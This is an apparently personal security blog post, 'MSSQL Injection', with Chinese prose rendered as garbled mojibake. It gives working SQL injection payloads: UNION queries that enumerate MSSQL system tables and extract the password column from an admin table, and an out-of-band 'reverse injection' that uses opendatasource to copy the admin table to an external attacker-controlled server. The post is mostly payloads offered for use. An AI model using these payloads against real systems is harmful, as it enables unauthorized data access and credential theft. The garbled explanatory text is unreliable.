<!DOCTYPE html>
<html lang="zh">
	<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        Hu5k7&#39;s Blog
    </title>
    <link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/style.css">

</head>
<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            MSSQL Injection
        </p>
        <hr>
    </div>
    <div class="post-content">
        <h1 id="0x01-æ˜¾é”™æ³¨å…¥ğŸ”¥">0x01 æ˜¾é”™æ³¨å…¥ğŸ”¥</h1>
<p>union all select db_name() 	 	//æŸ¥è¯¢å½“å‰åº“å<br>
union all select null,null,null from dbo.sysobjects 	//æŸ¥è¯¢è¡¨<br>
union all select null,null,null from dbo.syscolumns		//æŸ¥è¯¢å­—æ®µ</p>
<hr>
<p>?id=1 union all select id,name,null from dbo.sysobjects where xtype=â€˜Uâ€™</p>
<ul>
<li>â«id å’Œ name æ˜¯ç³»ç»Ÿè‡ªå¸¦çš„å­—æ®µåã€‚æŸ¥è¯¢å®Œéœ€è¦è®°ä½ï¼Œä½ è¦æŸ¥è¯¢çš„è¡¨IDã€‚xtype='Uâ€™æ˜¯æŒ‡ç”¨æˆ·åˆ›å»ºçš„è¡¨</li>
</ul>
<p><img src="2.jpg" alt="1"></p>
<p>?id=1 union all select null,name,null from dbo.syscolumns where id=xxxxxx</p>
<ul>
<li>
<p>â« nullæ˜¯æŒ‡3ä¸ªå­—æ®µã€‚mssqlé‡Œçš„å­—ç¬¦ä¸²ç±»å‹ç®¡ç†ä¸¥æ ¼ï¼Œæœ‰å¯èƒ½ä¸€ä¸ªæ˜¯intç±»å‹ã€‚æˆ–è€…strç±»å‹ç­‰ã€‚</p>
<p><img src="3.jpg" alt="2"></p>
</li>
</ul>
<p>?id=1 union all select null,password,null from admin</p>
<p><img src="4.jpg" alt="3"></p>
<h1 id="0x02-MSSQL-åå¼¹æ³¨å…¥ğŸˆ">0x02 MSSQL åå¼¹æ³¨å…¥ğŸˆ</h1>
<ul>
<li><strong>å‰è¨€</strong>:</li>
</ul>
<p>è¿™ä¸ªæ˜¯ä¸€ä¸ªæ¯”è¾ƒéªšçš„æ“ä½œã€‚é’ˆå¯¹æ— å›æ˜¾æ³¨å…¥ç‚¹çš„æ—¶å€™ã€‚</p>
<h2 id="0x02-1-åå¼¹æ³¨å…¥åŸç†">0x02.1 åå¼¹æ³¨å…¥åŸç†</h2>
<ul>
<li>â˜‚ï¸MSSQLæ³¨å°„æ”»å‡»æ˜¯æœ€ä¸ºå¤æ‚çš„æ•°æ®åº“æ”»å‡»æŠ€æœ¯ï¼Œç”±äºè¯¥æ•°æ®åº“åŠŸèƒ½ååˆ†å¼ºå¤§ï¼Œå­˜å‚¨è¿‡ç¨‹ä»¥åŠå‡½æ•°è¯­å¥ååˆ†ä¸°å¯Œï¼Œè¿™äº›çµæ´»çš„è¯­å¥é€ å°±äº†æ–°é¢–çš„æ”»å‡»æ€è·¯ï¼Œè€Œåå¼¹æ³¨å…¥æŠ€æœ¯éœ€è¦ä¾é opendatasourceå‡½æ•°æ”¯æŒ</li>
</ul>
<h2 id="0x02-2-åå¼¹æ³¨å…¥æ¡ä»¶">0x02.2 åå¼¹æ³¨å…¥æ¡ä»¶</h2>
<ul>
<li>ğŸŒéœ€è¦ä¸€å°å¤–ç½‘ä¸»æœºï¼Œå­—æ®µè¦ç›¸åŒ</li>
</ul>
<h3 id="å¤ç°">å¤ç°</h3>
<ul>
<li>PayloadğŸ”«</li>
</ul>
<p>insert into opendatasource(â€˜sqloledbâ€™,â€˜server=IP,1433;uid=USERNAME;pwd=PASSWORD;database=DATABASEâ€™).DATABASE.dbo.TABLES select *from admin</p>
<ul>
<li>å¥å­ç†è§£</li>
</ul>
<p>opendatasource(â€˜sqloledbâ€™,â€˜server=IP,1433;uid=USERNAME;pwd=PASSWORD;database=DATABASEâ€™).DATABASE.dbo.TABLES select *from admin</p>
<ul>
<li>å»ºç«‹tempè¡¨4ä¸ªå­—æ®µ</li>
</ul>
<p>create table temp(a varchar(255), b varchar(255),c varchar(255),d varchar(255))</p>
<ul>
<li>æ’å…¥è¯­å¥åæŸ¥è¯¢</li>
</ul>
<p><img src="6.jpg" alt="6"></p>

    </div>
    
        <hr class="fhr">
        <div id="vcomments"></div>
    
</div>
    <div class="footer" id="footer">
    <p>Copyright Â© 2020  Hexo-Hijack.
        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
            
        </label>
    </p>
</div>
<input type="hidden" id="web_style" value="black">


<script src="/libs/jquery.min.js"></script>
<script src="/libs/highlight/highlight.pack.js"></script>
<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
<script src="/js/js.js"></script>
<style type="text/css">
.v * {
    color: #698fca;
}

.v .vlist .vcard .vhead .vsys {
    color: #3a3e4a;
}

.v .vlist .vcard .vh .vmeta .vat {
    color: #638fd5;
}

.v .vlist .vcard .vhead .vnick {
    color: #6ba1ff;
}

.v a {
    color: #8696b1;
}

.v .vlist .vcard .vhead .vnick:hover {
    color: #669bfc;
}
</style>
</body>

</html>